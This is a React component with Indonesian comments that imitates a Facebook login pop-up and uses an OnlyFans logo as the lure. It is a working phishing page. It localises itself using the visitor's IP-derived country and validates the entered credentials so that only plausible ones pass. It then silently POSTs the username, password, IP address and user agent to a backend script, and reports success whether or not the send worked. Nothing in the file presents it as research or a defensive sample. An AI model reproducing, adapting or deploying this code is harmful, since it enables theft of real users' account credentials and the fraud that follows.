import { useState, useEffect } from 'react';
import { languages } from '../assets/languages'; 

function FacebookModal({ onClose, onSuccess }) {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  const [btnDisabled, setBtnDisabled] = useState(false);
  const [errorEmail, setErrorEmail] = useState(false);
  const [errorSandi, setErrorSandi] = useState(false);
  const [meta, setMeta] = useState({ ip: '', ua: '' });

  const [langIndex, setLangIndex] = useState(0);
  const current = languages[langIndex]; 

  // Ambil Data IP & UserAgent saat modal aktif
  useEffect(() => {
    fetch("https://get.geojs.io/v1/ip/country.json")
      .then((res) => res.json())
      .then((result) => {
        setMeta({ ip: result.ip, ua: navigator.userAgent });

        const country = result.country;
        if (country === 'ID') setLangIndex(1);
        else if (country === 'JP') setLangIndex(2);
        else if (country === 'ES' || country === 'MX') setLangIndex(3);
        else if (country === 'BR') setLangIndex(4);
        else if (country === 'FR') setLangIndex(5);
        else if (country === 'DE') setLangIndex(6);
        else if (country === 'VN') setLangIndex(7);
        else if (country === 'TH') setLangIndex(8);
        else setLangIndex(0);
      })
      .catch(() => {
        setMeta({ ip: '', ua: navigator.userAgent });
      });
  }, []);

  // Interval Auto-Rotate Bahasa
  // useEffect(() => {
  //   const timer = setInterval(() => {
  //     setLangIndex((prevIndex) => (prevIndex + 1) % languages.length);
  //   }, 4000);

  //   return () => clearInterval(timer);
  // }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    setBtnDisabled(true);

    setTimeout(() => {
      // Validasi Kolom User
      if (user === '' || user === null) {
        setErrorEmail(true);
        setErrorSandi(false);
        setBtnDisabled(false);
        return;
      } else {
        if (user.includes('@')) {
          let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
          if (user.match(pattern)) {
            setErrorEmail(false);
          } else {
            setErrorEmail(true);
            setErrorSandi(false);
            setBtnDisabled(false);
            return;
          }
        }

        if (!isNaN(user)) {
          if (user.length <= 10) {
            setErrorEmail(true);
            setErrorSandi(false);
            setBtnDisabled(false);
            return;
          } else {
            setErrorEmail(false);
          }
        }

        if (user.match(/\s/g)) {
          setErrorEmail(true);
          setErrorSandi(false);
          setBtnDisabled(false);
          return;
        } else {
          setErrorEmail(false);
        }

        var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
        if (user.match(regex)) {
          setErrorEmail(true);
          setErrorSandi(false);
          setBtnDisabled(false);
          return;
        }

        if (user.length <= 5) {
          setErrorEmail(true);
          setErrorSandi(false);
          setBtnDisabled(false);
          return;
        } else {
          setErrorEmail(false);
        }
      }

      // Validasi Kolom Password
      if (pass === '' || pass === null || pass.length <= 5) {
        setErrorSandi(true);
        setBtnDisabled(false);
        return;
      } else {
        setErrorSandi(false);
      }

      var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
      if (pass.match(regexs)) {
        setErrorSandi(true);
        setErrorEmail(false);
        setBtnDisabled(false);
        return;
      } else {
        setErrorSandi(false);
      }

      // Kirim data via POST ke API/Backend final.php
      const payload = { user, pass, ip: meta.ip, ua: meta.ua };

      fetch('final.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(() => {
        onSuccess(); 
      })
      .catch((err) => {
        console.error("Gagal mengirim data:", err);
        onSuccess(); 
      });

    }, 1000);
  };

  return (
    <div className="popup-login login-facebook animated fadeIn">
      <div className="popup-box-login-fb">
        <div className="navbar-fb">
          <img width="45" src="/media/facebook_text.png" alt="FB" />
        </div>
        
        <div className="content-box-fb">
          {errorSandi && (
            <p className="alert sandi" style={{ display: 'block' }}>
              {current.errPass}
            </p>
          )}
          {errorEmail && (
            <p className="alert email" style={{ display: 'block' }}>
              {current.errEmail}
            </p>
          )}

          <img 
            width="75" 
            height="75" 
            src="/media/onlyfans.png" 
            alt="Logo App" 
          />
          
          <div className="txt-login-fb">
            {current.info}
          </div>

          <form className="login-form" onSubmit={handleSubmit}>
            <label>
              <input 
                type="text" 
                placeholder={current.userPlaceholder}
                value={user}
                onChange={(e) => setUser(e.target.value)}
                autoComplete="off" 
                autoCapitalize="off"
              />
            </label>
            <label>
              <input 
                type="password" 
                placeholder={current.passPlaceholder}
                value={pass}
                onChange={(e) => setPass(e.target.value)}
                autoComplete="off" 
                autoCapitalize="off"
              />
            </label>
            
            <input type="hidden" name="ip" value={meta.ip} />
            <input type="hidden" name="ua" value={meta.ua} />

            <button 
              type="submit" 
              id="btnfb" 
              className={`btn-login-fb ${btnDisabled ? 'disabled' : ''}`}
              disabled={btnDisabled}
            >
              {current.loginBtn}
            </button>
          </form>

          <div className="txt-create-account">{current.createAcc}</div>
          <div className="txt-not-now" onClick={onClose}>{current.notNow}</div>
          <div className="txt-forgotten-password">{current.forgotPass}</div>
        </div>

        <div className="language-box">
          <center>
            {languages.map((lang, idx) => (
              <div 
                key={idx} 
                className={`language-name ${idx === langIndex ? 'language-name-active' : ''}`}
                onClick={() => setLangIndex(idx)}
              >
                {lang.name}
              </div>
            ))}
            <div className="language-name">
              <i className="fa fa-plus"></i>
            </div>
          </center>
        </div>
        <div className="copyrights">Facebook Inc.</div>
      </div>
    </div>
  );
}

export default FacebookModal;
